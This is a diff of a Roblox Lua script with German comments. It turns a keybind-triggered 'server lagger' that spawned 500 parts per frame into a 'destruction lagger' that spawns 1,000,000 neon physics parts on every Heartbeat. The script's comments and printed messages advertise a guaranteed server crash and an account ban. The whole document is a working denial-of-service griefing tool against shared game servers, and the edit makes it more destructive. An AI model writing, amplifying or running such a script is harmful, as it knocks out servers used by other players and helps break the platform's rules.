@@ -1,8 +1,8 @@
 --[[
-    SERVER-LAGGER MIT KEYBIND
-    - Drücke die Taste, um den Lagger ein- oder auszuschalten.
-    - Erstellt viele Teile, um den Server zu belasten.
-    - Du bist von dem Lag ausgeschlossen.
+    ZERSTÖRUNGS-LAGGER - 1.000.000 TEILE
+    - Keybind: K
+    - Erstellt 1.000.000 Teile auf einmal
+    - Garantierter Server-Crash!
 ]]
 
 local Players = game:GetService("Players")
@@ -16,42 +16,43 @@ local isLaggerActive = false
 local laggerConnection = nil
 
 -- ==============================
--- LAGGER-FUNKTION
+-- ZERSTÖRUNGS-FUNKTION (1.000.000 Teile)
 -- ==============================
 local function lagServer()
-    for i = 1, 500 do -- Erstelle 500 Teile pro Durchlauf
+    -- Erstelle 1.000.000 Teile auf einmal
+    for i = 1, 1000000 do
         local part = Instance.new("Part")
         part.Size = Vector3.new(1, 1, 1)
         part.Position = Vector3.new(
+            math.random(-1000, 1000),
             math.random(-500, 500),
-            math.random(-100, 100),
-            math.random(-500, 500)
+            math.random(-1000, 1000)
         )
         part.Anchored = false
         part.CanCollide = true
         part.Transparency = 0.5
         part.BrickColor = BrickColor.random()
+        part.Material = Enum.Material.Neon
         part.Parent = Workspace
         
-        -- Lösche die Teile nach 3 Sekunden wieder, um eine Überlastung zu vermeiden
-        Debris:AddItem(part, 3)
+        -- Nach 5 Sekunden löschen (wenn überhaupt so lange)
+        Debris:AddItem(part, 5)
     end
 end
 
 -- ==============================
--- LAGGER STARTEN / STOPPEN
+-- LAGGER STARTEN / STOPPEN (K)
 -- ==============================
 local function toggleLagger()
     isLaggerActive = not isLaggerActive
     
     if isLaggerActive then
-        print("🟢 Server-Lagger AKTIVIERT")
-        -- Starte eine Schleife, die den Lagger ausführt
+        print("💀 ZERSTÖRUNGS-LAGGER AKTIVIERT (1.000.000 Teile)")
         laggerConnection = RunService.Heartbeat:Connect(function()
             lagServer()
         end)
     else
-        print("🔴 Server-Lagger DEAKTIVIERT")
+        print("🔴 ZERSTÖRUNGS-LAGGER DEAKTIVIERT")
         if laggerConnection then
             laggerConnection:Disconnect()
             laggerConnection = nil
@@ -60,15 +61,16 @@ local function toggleLagger()
 end
 
 -- ==============================
--- KEYBIND (z.B. die Taste "G")
+-- KEYBIND: K
 -- ==============================
 UserInputService.InputBegan:Connect(function(input, gameProcessed)
     if gameProcessed then return end
-    if input.KeyCode == Enum.KeyCode.G then -- Hier kannst du die Taste ändern
+    if input.KeyCode == Enum.KeyCode.K then
         toggleLagger()
     end
 end)
 
-print("🔥 SERVER-LAGGER MIT KEYBIND GELADEN!")
-print("📌 Drücke die Taste 'G', um den Lagger ein- oder auszuschalten.")
-print("⚠️ EXTREM RISKANT - NUR AUF WEGWERF-ACCOUNTS VERWENDEN!")
+print("💀 ZERSTÖRUNGS-LAGGER GELADEN!")
+print("📌 Drücke K = AN/AUS")
+print("📌 1.000.000 Teile pro Sekunde")
+print("⚠️ GARANTIERTER CRASH + BANN!")
